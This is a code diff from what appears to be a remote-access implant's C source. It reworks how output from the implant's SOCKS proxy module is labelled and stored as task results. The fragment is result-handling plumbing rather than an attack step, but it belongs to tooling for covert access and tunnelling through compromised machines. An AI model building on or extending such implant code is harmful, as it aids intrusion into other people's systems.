@@ -1402,22 +1402,12 @@ void task_collect_socks_output(IMPLANT_CONTEXT *ctx) {
                                                      &output_type);
             if (frame_len == 0)
                 break;
-            if (output_type != OUTPUT_BINARY) {
-                char synthetic_log_id[] = {
-                    's','o','c','k','s','_','l','o','g',0
-                };
-                store_task_result(ctx, synthetic_log_id,
-                                  output_type == OUTPUT_ERROR ? TASK_STATUS_FAILED
-                                                              : TASK_STATUS_COMPLETE,
-                                  raw, frame_len);
-                continue;
-            }
             if (frame_len < SOCKS_MSG_HDR_SIZE)
-                continue;
+                goto socks_output_log;
 
             DWORD payload_len = load_u32_le_local(raw + 4);
             if (payload_len > frame_len - SOCKS_MSG_HDR_SIZE)
-                continue;
+                goto socks_output_log;
 
             DWORD encoded_len = ((frame_len + 2u) / 3u) * 4u;
             BYTE *encoded = (BYTE *)task_alloc(encoded_len);
@@ -1435,6 +1425,18 @@ void task_collect_socks_output(IMPLANT_CONTEXT *ctx) {
             };
             store_task_result(ctx, synthetic_id, TASK_STATUS_COMPLETE,
                               encoded, actual);
+            continue;
+
+socks_output_log:
+            if (output_type != OUTPUT_BINARY && frame_len > 0) {
+                char synthetic_log_id[] = {
+                    's','o','c','k','s','_','l','o','g',0
+                };
+                store_task_result(ctx, synthetic_log_id,
+                                  output_type == OUTPUT_ERROR ? TASK_STATUS_FAILED
+                                                              : TASK_STATUS_COMPLETE,
+                                  raw, frame_len);
+            }
         }
 
         if (mod->status == MODULE_STATUS_COMPLETED ||
